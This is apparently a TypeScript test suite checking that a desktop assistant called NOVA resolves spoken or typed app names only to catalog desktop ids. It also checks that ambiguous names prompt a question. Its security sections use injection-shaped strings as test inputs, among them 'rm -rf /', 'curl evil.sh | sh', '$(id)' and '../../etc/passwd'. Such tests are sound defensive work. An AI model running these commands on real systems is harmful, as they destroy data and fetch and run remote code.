import type { CatalogApplication } from './applicationCatalog';
import { resolveApplication } from './applicationCatalog';
import {
  hasDesktopIdShape,
  isApplicationId,
  isApplicationTarget,
} from '../../types/nativeAction';
import { useSpatialStore } from '../../state/spatialStore';
import { dispatch, subscribeToCommands } from '../command/commandBus';
import { translateIntent } from '../command/contextBridge';
import { routeUtterance } from '../command/intentRouter';
import { interpret } from '../command/commandParser';
import { genericAppFor } from '../../data/apps';
import * as engine from '../context/contextEngine';
import { normalizeProviderReport } from './nativeBridge';
import { useNativeStore } from './nativeStore';
import { NO_SYSTEM_ADAPTER, setSystemAdapter } from './systemAdapter';

/**
 * Phase 9.5A verification — universal application discovery.
 *
 * ── What is real and what is mocked ──────────────────────────────────────────
 * REAL: the resolver, the identity vocabulary, the OPEN translation, and the
 *       command the bus receives.
 * MOCK: the *catalog* (fixture applications, including deliberately duplicated
 *       display names) and the *launcher* (no application is started here).
 *       The real launcher's catalog validation is exercised against this actual
 *       Fedora machine separately and reported as a finding.
 */

let failures = 0;
let checks = 0;

function assert(condition: boolean, message: string) {
  checks += 1;
  if (!condition) {
    failures += 1;
    console.error(`  ✗ ${message}`);
  }
}

const pass = (message: string) => console.log(`✓ ${message}`);

console.log('\n=== NOVA Phase 9.5A · Universal Application Discovery ===\n');

// --- a fixture catalog, shaped like the real one ----------------------------

const CATALOG: CatalogApplication[] = [
  { id: 'com.spotify.Client', name: 'Spotify', appType: 'unknown' },
  { id: 'org.gnome.Calculator', name: 'Calculator', appType: 'unknown' },
  { id: 'org.videolan.VLC', name: 'VLC media player', appType: 'unknown' },
  { id: 'com.discordapp.Discord', name: 'Discord', appType: 'unknown' },
  { id: 'org.gnome.Ptyxis', name: 'Terminal', appType: 'terminal' },
  { id: 'org.mozilla.firefox', name: 'Firefox', appType: 'browser' },
  { id: 'com.brave.Browser', name: 'Brave', appType: 'browser' },
  { id: 'org.gnome.Nautilus', name: 'Files', appType: 'files' },
  { id: 'org.gnome.TextEditor', name: 'Text Editor', appType: 'notes' },
  { id: 'com.visualstudio.code', name: 'Visual Studio Code', appType: 'code' },
  { id: 'org.libreoffice.LibreOffice.writer', name: 'LibreOffice Writer', appType: 'unknown' },
  { id: 'org.libreoffice.LibreOffice.calc', name: 'LibreOffice Calc', appType: 'unknown' },
];

/** Two applications that genuinely share a display name. */
const DUPLICATED: CatalogApplication[] = [
  ...CATALOG,
  { id: 'org.kde.konsole', name: 'Terminal', appType: 'terminal' },
];

// --- the resolver ------------------------------------------------------------

console.log('--- Name resolution ---');
{
  const exact = resolveApplication('Spotify', CATALOG);
  assert(exact.status === 'resolved', 'an exact application name resolves');
  assert(exact.status === 'resolved' && exact.id === 'com.spotify.Client', 'to its desktop id');
  assert(exact.status === 'resolved' && exact.via === 'display-name', 'by display name');

  for (const phrase of ['spotify', 'SPOTIFY', '  Spotify  ', 'the Spotify app']) {
    const found = resolveApplication(phrase, CATALOG);
    assert(
      found.status === 'resolved' && found.id === 'com.spotify.Client',
      `"${phrase}" resolves case- and filler-insensitively`,
    );
  }

  const byId = resolveApplication('org.gnome.Calculator', CATALOG);
  assert(byId.status === 'resolved' && byId.id === 'org.gnome.Calculator', 'a desktop id resolves to itself');

  const partial = resolveApplication('VLC', CATALOG);
  assert(
    partial.status === 'resolved' && partial.id === 'org.videolan.VLC',
    `an unambiguous token resolves, got ${JSON.stringify(partial)}`,
  );

  const multiWord = resolveApplication('libre writer', CATALOG);
  assert(
    multiWord.status === 'resolved' && multiWord.id === 'org.libreoffice.LibreOffice.writer',
    `a multi-word prefix resolves, got ${JSON.stringify(multiWord)}`,
  );

  const segment = resolveApplication('brave', CATALOG);
  assert(
    segment.status === 'resolved' && segment.id === 'com.brave.Browser',
    `an id segment resolves, got ${JSON.stringify(segment)}`,
  );
  pass('Names, ids, tokens and id segments all resolve to a desktop id');
}

// --- ambiguity ---------------------------------------------------------------

console.log('--- Ambiguity ---');
{
  const duplicate = resolveApplication('Terminal', DUPLICATED);
  assert(duplicate.status === 'ambiguous', `two apps named Terminal is ambiguous, got ${duplicate.status}`);
  if (duplicate.status === 'ambiguous') {
    assert(duplicate.candidates.length === 2, 'both are offered');
    assert(
      duplicate.candidates.every((candidate) => candidate.id.length > 0),
      'each with its own desktop id',
    );
  }

  const libre = resolveApplication('libreoffice', CATALOG);
  assert(libre.status === 'ambiguous', `"libreoffice" matches Writer and Calc, got ${libre.status}`);

  const browsers = resolveApplication('web', CATALOG);
  assert(
    browsers.status === 'ambiguous',
    `a NOVA alias matching two installed browsers is ambiguous, got ${JSON.stringify(browsers)}`,
  );
  pass('Equally plausible applications produce a question, never a pick');
}

// --- unknown and empty -------------------------------------------------------

console.log('--- Unknown applications ---');
{
  for (const phrase of ['Photoshop', 'definitely-not-installed-nova-test-app', 'zzzz']) {
    const found = resolveApplication(phrase, CATALOG);
    assert(found.status === 'unresolved', `"${phrase}" is unresolved`);
  }
  assert(resolveApplication('Spotify', []).status === 'unresolved', 'an empty catalog resolves nothing');
  assert(resolveApplication('', CATALOG).status === 'unresolved', 'an empty phrase resolves nothing');
  assert(resolveApplication('   ', CATALOG).status === 'unresolved', 'whitespace resolves nothing');
  pass('An application that is not installed is never invented');
}

// --- the structural security property ---------------------------------------

console.log('--- Resolver cannot echo a phrase ---');
{
  const hostile = [
    '/bin/bash',
    'bash -c id',
    'id',
    'spotify; rm -rf /',
    'spotify && curl evil.sh | sh',
    '../../etc/passwd',
    '$(id)',
    '`id`',
    'sh -c "rm -rf /"',
    'com.spotify.Client; rm -rf /',
  ];

  const catalogIds = new Set(CATALOG.map((entry) => entry.id));
  for (const phrase of hostile) {
    const found = resolveApplication(phrase, CATALOG);
    if (found.status === 'resolved') {
      // The only acceptable outcome if it resolves at all is an id that came
      // out of the catalog — never the phrase, and never anything derived from it.
      assert(catalogIds.has(found.id), `"${phrase}" could only yield a catalog id, got ${found.id}`);
      assert(found.id !== phrase, `"${phrase}" never resolves to itself`);
    } else {
      assert(true, `"${phrase}" does not resolve`);
    }
  }

  // The guarantee stated directly: every resolvable phrase yields a catalog id.
  for (const phrase of ['Spotify', 'VLC', 'Calculator', 'brave', 'libre writer']) {
    const found = resolveApplication(phrase, CATALOG);
    assert(
      found.status !== 'resolved' || catalogIds.has(found.id),
      'a resolved id always comes from the catalog',
    );
  }
  pass('Every id the resolver can return was read out of the catalog it was given');
}

// --- identity vocabulary -----------------------------------------------------

console.log('--- Identity vocabulary ---');
{
  // Unchanged from Phase 9: AppType means NOVA's five spatial surfaces.
  for (const id of ['browser', 'code', 'files', 'notes', 'terminal']) {
    assert(isApplicationId(id), `"${id}" is still a NOVA spatial application`);
  }
  assert(!isApplicationId('org.gnome.Ptyxis'), 'a desktop id is still NOT an AppType');
  assert(!isApplicationId('com.spotify.Client'), 'nor is any discovered application');

  // The shape gate. Deliberately not the security boundary, but it must still
  // refuse everything injection-shaped.
  assert(hasDesktopIdShape('com.spotify.Client'), 'a desktop id has the right shape');
  assert(hasDesktopIdShape('org.gnome.Calculator'), 'so does another');
  for (const junk of [
    '/bin/bash', 'bash -c id', 'spotify; rm -rf /', '../../etc/passwd',
    'a b', 'a/b', 'a;b', 'a|b', 'a&b', 'a$b', 'a`b', "a'b", 'a"b', 'a\nb',
    '.hidden', '-leading', '', null, undefined, 42, {},
  ]) {
    assert(!hasDesktopIdShape(junk), `${JSON.stringify(junk)} is not a desktop id shape`);
  }
  assert(!hasDesktopIdShape('x'.repeat(200)), 'an absurdly long id is refused');

  assert(isApplicationTarget('terminal'), 'a NOVA type is a valid target');
  assert(isApplicationTarget('com.spotify.Client'), 'so is a well-shaped desktop id');
  assert(!isApplicationTarget('bash -c id'), 'a command is not');
  pass('AppType stayed narrow; desktop ids are a separate, shape-checked identity');
}

// --- OPEN translation --------------------------------------------------------

console.log('--- OPEN translation ---');
{
  setSystemAdapter(NO_SYSTEM_ADAPTER);
  const stop = engine.startContextEngine();
  dispatch({ action: 'workspace', target: 'development' }, 'system');

  // Install the fixture catalog as the "host reading" the bridge will consult.
  useNativeStore.getState().setSnapshot(
    normalizeProviderReport(
      {
        platform: 'linux',
        osName: 'Fedora Linux',
        sessionType: 'wayland',
        capabilities: {
          platformDetection: true,
          applicationEnumeration: true,
          runningProcessDetection: true,
          windowEnumeration: false,
          windowGeometry: false,
          workspaceEnumeration: false,
        },
        applications: CATALOG.map((entry) => ({ id: entry.id, name: entry.name, running: false })),
        windows: [],
        notes: [],
      },
      1,
    ),
  );

  const open = (target: string) =>
    translateIntent(engine.getCurrentContext(), {
      status: 'ok',
      commands: [{ action: 'OPEN', target }],
    });

  // The five spatial applications keep their exact Phase 9 behaviour.
  for (const app of ['terminal', 'browser', 'notes', 'files', 'code'] as const) {
    useSpatialStore.getState().removeWindow(app);
    engine.resetContextEngine();
    const result = open(app);
    assert(
      result.commands[0]?.action === 'open' && result.commands[0].target === app,
      `"open ${app}" still produces the spatial open command, got ${JSON.stringify(result.commands[0])}`,
    );
    dispatch({ action: 'open', target: app }, 'system');
  }
  pass('The five spatial applications are untouched by discovery');

  // A discovered application becomes a launch, not a spatial open.
  const spotify = open('Spotify');
  assert(spotify.commands.length === 1, 'a discovered application produces one command');
  assert(
    spotify.commands[0].action === 'open-application',
    `and it is open-application, got ${spotify.commands[0].action}`,
  );
  assert(
    spotify.commands[0].action === 'open-application' &&
      spotify.commands[0].applicationId === 'com.spotify.Client',
    'targeting the desktop id',
  );
  assert(
    spotify.commands[0].action === 'open-application' && spotify.commands[0].name === 'Spotify',
    'carrying the display name for the notice',
  );
  assert(spotify.clarification === null, 'without a question');

  const calculator = open('Calculator');
  assert(
    calculator.commands[0]?.action === 'open-application' &&
      calculator.commands[0].applicationId === 'org.gnome.Calculator',
    'another discovered application resolves too',
  );

  // Unknown: safe failure, exactly as before.
  const unknown = open('Photoshop');
  assert(unknown.commands.length === 0, 'an unknown application produces no command');
  assert(unknown.clarification === null, 'and no question');

  /**
   * A phrase that collides with an existing Phase 4 *task* alias.
   *
   * "definitely-not-installed-nova-test-app" contains "nova", which
   * `findTaskByPhrase` claims before OPEN is ever reached, so this asks which
   * window is meant rather than reporting an unknown application. That is
   * pre-existing Phase 4 behaviour and is recorded here rather than papered
   * over. What matters for this phase is the invariant below: nothing launches.
   */
  const collides = open('definitely-not-installed-nova-test-app');
  assert(
    !collides.commands.some((c) => c.action === 'open-application'),
    'a task-alias collision still launches nothing',
  );
  assert(
    !collides.commands.some((c) => c.action === 'open'),
    'and opens no spatial window either',
  );

  // Injection-shaped input must never become a command.
  for (const phrase of ['bash -c id', '/bin/bash', 'spotify; rm -rf /', '../../etc/passwd']) {
    const hostile = open(phrase);
    const launched = hostile.commands.filter((c) => c.action === 'open-application');
    assert(
      launched.length === 0 ||
        CATALOG.some(
          (entry) =>
            launched[0].action === 'open-application' && entry.id === launched[0].applicationId,
        ),
      `"${phrase}" produced no arbitrary launch, got ${JSON.stringify(hostile.commands)}`,
    );
    assert(
      !hostile.commands.some(
        (c) => c.action === 'open-application' && !/^[A-Za-z0-9][A-Za-z0-9._-]*$/.test(c.applicationId),
      ),
      `"${phrase}" never yields a malformed application id`,
    );
  }
  pass('Discovered applications launch; unknown and hostile input do not');

  // Ambiguity reaches the user as a question with nothing executed.
  useNativeStore.getState().setSnapshot(
    normalizeProviderReport(
      {
        platform: 'linux',
        sessionType: 'wayland',
        capabilities: {
          platformDetection: true,
          applicationEnumeration: true,
          runningProcessDetection: false,
          windowEnumeration: false,
          windowGeometry: false,
          workspaceEnumeration: false,
        },
        applications: DUPLICATED.map((e) => ({ id: e.id, name: e.name, running: false })),
        windows: [],
        notes: [],
      },
      1,
    ),
  );
  const ambiguous = open('LibreOffice');
  assert(ambiguous.clarification !== null, 'an ambiguous application asks');
  assert(ambiguous.commands.length === 0, 'and launches nothing');
  assert(
    (ambiguous.clarification?.candidates.length ?? 0) >= 2,
    'naming the applications it could have meant',
  );
  pass('An ambiguous application name asks rather than guessing');

  stop();
}

// --- the command bus ---------------------------------------------------------

console.log('--- Command bus integration ---');
{
  setSystemAdapter(NO_SYSTEM_ADAPTER);
  const stop = engine.startContextEngine();
  const seen: Array<{ action: string; source: string }> = [];
  const unsubscribe = subscribeToCommands(({ command, source }) =>
    seen.push({ action: command.action, source }),
  );

  const windowsBefore = Object.keys(useSpatialStore.getState().windows).sort().join(',');
  seen.length = 0;

  // With no native provider, the command is accepted and reported, not fatal.
  dispatch(
    { action: 'open-application', applicationId: 'com.spotify.Client', name: 'Spotify' },
    'command-line',
  );

  assert(
    seen.some((entry) => entry.action === 'open-application'),
    'open-application reaches the existing bus',
  );
  assert(
    Object.keys(useSpatialStore.getState().windows).sort().join(',') === windowsBefore,
    'and creates no spatial window — a discovered application has no surface',
  );
  assert(
    Boolean(useSpatialStore.getState().notice),
    'while still telling the user what happened',
  );
  pass('A discovered application launches through the existing bus and stays non-spatial');

  unsubscribe();
  stop();
}

// --- the whole sentence, end to end -----------------------------------------

console.log('--- "open <application>" through routeUtterance ---');
{
  setSystemAdapter(NO_SYSTEM_ADAPTER);
  const stop = engine.startContextEngine();
  dispatch({ action: 'workspace', target: 'development' }, 'system');

  useNativeStore.getState().setSnapshot(
    normalizeProviderReport(
      {
        platform: 'linux',
        sessionType: 'wayland',
        capabilities: {
          platformDetection: true,
          applicationEnumeration: true,
          runningProcessDetection: false,
          windowEnumeration: false,
          windowGeometry: false,
          workspaceEnumeration: false,
        },
        applications: CATALOG.map((e) => ({ id: e.id, name: e.name, running: false })),
        windows: [],
        notes: [],
      },
      1,
    ),
  );

  const seen: Array<{ action: string; id?: string }> = [];
  const unsubscribe = subscribeToCommands(({ command }) =>
    seen.push({
      action: command.action,
      id: command.action === 'open-application' ? command.applicationId : undefined,
    }),
  );

  /**
   * This is the path a typed or spoken sentence actually takes, and the reason
   * it is tested separately from `translateIntent`: the verb has to be stripped
   * before the catalog ever sees the phrase, and that happens in the router.
   */
  seen.length = 0;
  await routeUtterance('open Spotify', 'command-line');
  assert(
    seen.some((entry) => entry.action === 'open-application' && entry.id === 'com.spotify.Client'),
    `"open Spotify" reached the bus as a launch, saw ${JSON.stringify(seen)}`,
  );

  seen.length = 0;
  await routeUtterance('open Calculator', 'voice');
  assert(
    seen.some((entry) => entry.id === 'org.gnome.Calculator'),
    `"open Calculator" resolved through the router, saw ${JSON.stringify(seen)}`,
  );

  seen.length = 0;
  await routeUtterance('launch VLC', 'command-line');
  assert(seen.some((entry) => entry.id === 'org.videolan.VLC'), '"launch" works as well as "open"');

  // The five spatial applications still take the spatial path.
  useSpatialStore.getState().removeWindow('terminal');
  seen.length = 0;
  await routeUtterance('open terminal', 'command-line');
  assert(
    seen.some((entry) => entry.action === 'open'),
    `"open terminal" still produces the spatial open, saw ${JSON.stringify(seen)}`,
  );
  assert(
    !seen.some((entry) => entry.action === 'open-application'),
    'and does not take the discovery path',
  );

  // Nothing hostile becomes a launch through the full sentence path.
  for (const sentence of [
    'open bash -c id',
    'open /bin/bash',
    'open spotify; rm -rf /',
    'open Photoshop',
  ]) {
    seen.length = 0;
    await routeUtterance(sentence, 'command-line');
    const launched = seen.filter((entry) => entry.action === 'open-application');
    assert(
      launched.every((entry) => CATALOG.some((app) => app.id === entry.id)),
      `"${sentence}" launched nothing outside the catalog, saw ${JSON.stringify(seen)}`,
    );
  }
  pass('A whole sentence resolves through the router to a catalog id, or to nothing');

  unsubscribe();
  stop();
  setSystemAdapter(NO_SYSTEM_ADAPTER);
}

// --- category vs product ----------------------------------------------------

console.log('--- Category names vs product names ---');
{
  /**
   * The defect this section exists for.
   *
   * `commandParser.findApp` scans a whole phrase for alias substrings, and
   * `chrome` and `firefox` were declared aliases of NOVA's Browser surface. So
   * "open Chrome" resolved to `OPEN(browser)`, the server picked whichever
   * browser its allowlist preferred, and asking for Chrome launched Firefox.
   */

  // Category words still name NOVA's spatial applications.
  for (const [phrase, app] of [
    ['terminal', 'terminal'], ['browser', 'browser'], ['code', 'code'],
    ['files', 'files'], ['notes', 'notes'], ['the browser', 'browser'],
    ['my notes', 'notes'], ['shell', 'terminal'], ['web', 'browser'],
    ['file manager', 'files'], ['editor', 'code'],
  ] as const) {
    assert(genericAppFor(phrase) === app, `"${phrase}" is the category name of ${app}`);
  }

  // Product names are not category names.
  for (const phrase of [
    'chrome', 'Chrome', 'firefox', 'Firefox', 'vscode', 'Visual Studio Code',
    'brave', 'spotify', 'calculator', 'zsh', 'bash', '/bin/bash',
    'bash -c id', 'terminal -c something', 'libreoffice',
  ]) {
    assert(genericAppFor(phrase) === null, `"${phrase}" is NOT a category name`);
  }
  pass('A category word names a NOVA surface; a product name does not');

  // --- the Phase 1 parser -----------------------------------------------
  const opens = (text: string) => {
    const r = interpret(text);
    const c = r.commands[0];
    return c && c.action === 'open' ? c.target : null;
  };

  // 1-3. Generic opens still resolve to the spatial applications.
  assert(opens('open terminal') === 'terminal', '"open terminal" still resolves Terminal');
  assert(opens('open browser') === 'browser', '"open browser" still resolves Browser');
  assert(opens('open code') === 'code', '"open code" still resolves Code');
  assert(opens('open files') === 'files', '"open files" still resolves Files');
  assert(opens('open notes') === 'notes', '"open notes" still resolves Notes');
  assert(opens('launch the terminal') === 'terminal', 'and with an article and a synonym verb');

  // 6-8. Product names are NOT claimed by the parser — they go to the catalog.
  for (const phrase of ['open Chrome', 'open Firefox', 'open Visual Studio Code', 'open Spotify', 'open Calculator']) {
    const r = interpret(phrase);
    assert(r.understood === false, `"${phrase}" is left unclaimed by the Phase 1 parser`);
    assert(r.commands.length === 0, `and produces no command there`);
  }
  assert(opens('open Chrome') === null, '"open Chrome" never becomes OPEN(browser)');
  assert(opens('open Firefox') === null, '"open Firefox" never becomes OPEN(browser)');
  assert(opens('open Visual Studio Code') === null, '"open Visual Studio Code" never becomes OPEN(code)');

  // 11-12. Paths and arguments are not application names at all.
  for (const phrase of [
    'open /bin/bash', 'open bash -c id', 'open terminal -c something',
    'open /usr/bin/ptyxis', 'open spotify; rm -rf /', 'open $(id)', 'open a|b',
  ]) {
    const r = interpret(phrase);
    assert(r.understood === false, `"${phrase}" is not understood by the parser`);
    assert(r.commands.length === 0, `and yields no command whatsoever`);
  }
  pass('Products and paths are left for the catalog; categories are not');

  // 4-5. Every other Phase 1 command still uses the full alias list.
  const first = (text: string) => interpret(text).commands[0];
  const move = first('move browser left of code');
  assert(
    move?.action === 'move' && move.target === 'browser' && move.reference === 'code',
    `"move browser left of code" is unchanged, got ${JSON.stringify(move)}`,
  );
  const right = first('move terminal right of notes');
  assert(
    right?.action === 'move' && right.target === 'terminal',
    `"move terminal right of notes" is unchanged, got ${JSON.stringify(right)}`,
  );
  assert(first('make code bigger')?.action === 'scale', '"make code bigger" is unchanged');
  assert(first('minimize terminal')?.action === 'minimize', '"minimize terminal" is unchanged');
  assert(first('close chrome')?.action === 'close', '"close chrome" still uses the full alias list');
  assert(first('focus code')?.action === 'focus', '"focus code" is unchanged');
  assert(first('switch to study')?.action === 'workspace', 'workspace switching is unchanged');
  assert(first('arrange my workspace')?.action === 'arrange', 'arranging is unchanged');
  pass('Every non-open Phase 1 command keeps its existing alias behaviour');
}

// --- the whole sentence, with a real-shaped catalog --------------------------

console.log('--- Product names through the full pipeline ---');
{
  setSystemAdapter(NO_SYSTEM_ADAPTER);
  const stop = engine.startContextEngine();
  dispatch({ action: 'workspace', target: 'development' }, 'system');

  /** Shaped like the real host: it really does contain "Terminal" and "Files". */
  const REAL_SHAPED: CatalogApplication[] = [
    { id: 'org.gnome.Ptyxis', name: 'Terminal', appType: 'terminal' },
    { id: 'org.gnome.Nautilus', name: 'Files', appType: 'files' },
    { id: 'org.mozilla.firefox', name: 'Firefox', appType: 'browser' },
    { id: 'com.google.Chrome', name: 'Google Chrome', appType: 'browser' },
    { id: 'com.brave.Browser', name: 'Brave', appType: 'browser' },
    { id: 'com.visualstudio.code', name: 'Visual Studio Code', appType: 'code' },
    { id: 'org.gnome.Calculator', name: 'Calculator', appType: 'unknown' },
    { id: 'com.spotify.Client', name: 'Spotify', appType: 'unknown' },
  ];
  useNativeStore.getState().setSnapshot(
    normalizeProviderReport(
      {
        platform: 'linux',
        sessionType: 'wayland',
        capabilities: {
          platformDetection: true, applicationEnumeration: true, runningProcessDetection: false,
          windowEnumeration: false, windowGeometry: false, workspaceEnumeration: false,
        },
        applications: REAL_SHAPED.map((e) => ({ id: e.id, name: e.name, running: false })),
        windows: [], notes: [],
      },
      1,
    ),
  );

  const seen: Array<{ action: string; id?: string; target?: string }> = [];
  const unsubscribe = subscribeToCommands(({ command }) =>
    seen.push({
      action: command.action,
      id: command.action === 'open-application' ? command.applicationId : undefined,
      target: command.action === 'open' ? command.target : undefined,
    }),
  );

  const say = async (text: string) => {
    seen.length = 0;
    await routeUtterance(text, 'command-line');
    return seen;
  };

  // 7-8. Specific products resolve to their own desktop ids.
  await say('open Chrome');
  assert(
    seen.some((e) => e.id === 'com.google.Chrome'),
    `"open Chrome" resolves Chrome, saw ${JSON.stringify(seen)}`,
  );
  assert(
    !seen.some((e) => e.target === 'browser' || e.id === 'org.mozilla.firefox'),
    'and never Firefox or the generic Browser surface',
  );

  await say('open Firefox');
  assert(seen.some((e) => e.id === 'org.mozilla.firefox'), '"open Firefox" resolves Firefox');
  assert(!seen.some((e) => e.target === 'browser'), 'and not the generic Browser surface');

  await say('open Visual Studio Code');
  assert(seen.some((e) => e.id === 'com.visualstudio.code'), '"open Visual Studio Code" resolves VS Code');

  // 9-10. Discovered applications still work.
  await say('open Calculator');
  assert(seen.some((e) => e.id === 'org.gnome.Calculator'), '"open Calculator" still resolves');
  await say('open Spotify');
  assert(seen.some((e) => e.id === 'com.spotify.Client'), '"open Spotify" still resolves');

  /**
   * The critical one. The real catalog contains an application literally named
   * "Terminal", so without a category rule "open terminal" would resolve to it
   * as a bare launch and NOVA's spatial Terminal would never appear.
   */
  useSpatialStore.getState().removeWindow('terminal');
  await say('open terminal');
  assert(
    seen.some((e) => e.action === 'open' && e.target === 'terminal'),
    `"open terminal" still opens the SPATIAL terminal, saw ${JSON.stringify(seen)}`,
  );
  assert(
    !seen.some((e) => e.id === 'org.gnome.Ptyxis'),
    'and is not diverted to the identically-named installed application',
  );
  useSpatialStore.getState().removeWindow('files');
  await say('open files');
  assert(
    seen.some((e) => e.action === 'open' && e.target === 'files'),
    '"open files" likewise, despite an installed application called "Files"',
  );

  // 11-13. Nothing path-shaped ever reaches the native layer.
  for (const sentence of ['open /bin/bash', 'open bash -c id', 'open terminal -c something']) {
    await say(sentence);
    assert(
      !seen.some((e) => e.action === 'open-application'),
      `"${sentence}" launches nothing natively, saw ${JSON.stringify(seen)}`,
    );
    assert(
      !seen.some((e) => e.action === 'open' && e.target === 'terminal'),
      `"${sentence}" does not become the Terminal either`,
    );
  }
  pass('Products resolve specifically; categories stay spatial; paths do neither');

  unsubscribe();
  stop();
  setSystemAdapter(NO_SYSTEM_ADAPTER);
}

// --- the canonical development entry point ----------------------------------

console.log('--- Development entry point ---');
{
  /**
   * The regression this section exists for.
   *
   * Phase 9.5A worked and still appeared broken, because `npm run dev` started
   * plain Vite — which serves the application but has no `/api/native/*`. The
   * browser therefore had no catalog and every discovered application failed to
   * resolve, while the five built-in ones kept working and hid the problem.
   *
   * This is a static check on purpose: booting a server inside the unit suite
   * would be slow and flaky, and the invariant worth protecting is simply that
   * the command a person actually types serves the API.
   */
  const nodeFs = 'node:fs';
  const { readFileSync } = (await import(nodeFs)) as {
    readFileSync: (path: string, encoding: string) => string;
  };
  const manifest = JSON.parse(readFileSync('package.json', 'utf8')) as {
    scripts: Record<string, string>;
  };
  const server = readFileSync('server.ts', 'utf8');

  const dev = manifest.scripts.dev ?? '';
  assert(dev.includes('server.ts'), `\`npm run dev\` starts the API server, got "${dev}"`);
  assert(
    !/^\s*vite\s*$/.test(dev),
    'and is not bare Vite, which has no /api routes',
  );

  assert(
    server.includes("'/api/native/snapshot'"),
    'the server that `npm run dev` starts declares the native snapshot route',
  );
  assert(
    server.includes("'/api/native/action'"),
    'and the native action route',
  );
  assert(server.includes("'/api/gemini/command'"), 'and the intelligence route');

  /**
   * Any *other* script that serves the application must say in its name that it
   * lacks the API. An unlabelled second entry point is exactly what made the
   * original failure invisible.
   */
  for (const [name, script] of Object.entries(manifest.scripts)) {
    if (name === 'dev') continue;
    // A development server only — `vite build` is not a server, and
    // `vite preview` serves a production bundle for inspection.
    if (!/^vite(\s+dev)?\s*$/.test(script.trim())) continue;
    assert(
      /frontend-only|no-native|spatial-only/.test(name),
      `"${name}": "${script}" is a dev server without /api and must say so in its name`,
    );
  }
  pass('`npm run dev` is the canonical entry point and serves /api/native/*');
}

console.log('\n========================================');
if (failures) {
  throw new Error(`${failures} of ${checks} application catalog assertions FAILED`);
}
console.log(`ALL ${checks} APPLICATION CATALOG ASSERTIONS PASSED! 🎉`);
console.log('========================================');
